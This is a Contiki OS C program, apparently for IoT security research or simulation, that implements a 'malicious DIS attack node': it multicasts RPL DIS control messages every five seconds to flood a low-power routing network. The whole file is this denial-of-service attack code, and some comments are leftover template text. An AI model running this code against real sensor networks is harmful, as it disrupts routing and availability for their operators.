/*
 * Copyright (c) 2006, Swedish Institute of Computer Science.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the Institute nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE INSTITUTE AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE INSTITUTE OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 * This file is part of the Contiki operating system.
 *
 */

/**
 * \file
 *         A very simple Contiki application showing how Contiki programs look
 * \author
 *         Elef papa
 */

#include "contiki.h"
#include "net/ipv6/uip-icmp6.h"
#include "net/routing/rpl-classic/rpl.h"
#include "net/routing/rpl-classic/rpl-private.h"
#include "net/ipv6/uip.h"
#include "sys/log.h"
#include <stdio.h> /* For printf() */
#include "net/routing/routing.h"
#undef NETSTACK_ROUTING
#define NETSTACK_ROUTING null_routing_driver
#define RPL_CODE_DIS 0x00

/*---------------------------------------------------------------------------*/
#define LOG_MODULE "RPL-dis-att"
#define LOG_LEVEL LOG_LEVEL_INFO





PROCESS(dis_attack_process, "DIS ATTACK");
AUTOSTART_PROCESSES(&dis_attack_process);
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(dis_attack_process, ev, data)
{
  static struct etimer timer;
  uip_ipaddr_t* addr = NULL;
  
  PROCESS_BEGIN();
  printf("Malicious DIS attack node started\n");
  /* Setup a periodic timer that expires after 10 seconds. */
  etimer_set(&timer, CLOCK_SECOND * 5);
  
  
  while(1) {

    /* Wait for the periodic timer to expire and then restart the timer. */
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
    // uip_create_linklocal_allnodes_mcast(&addr);
    // uip_icmp6_send(&addr, ICMP6_RPL, RPL_CODE_DIS, 0);
    dis_output(addr);
    
    printf("Sent multicast DIS\n");
    etimer_reset(&timer);
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
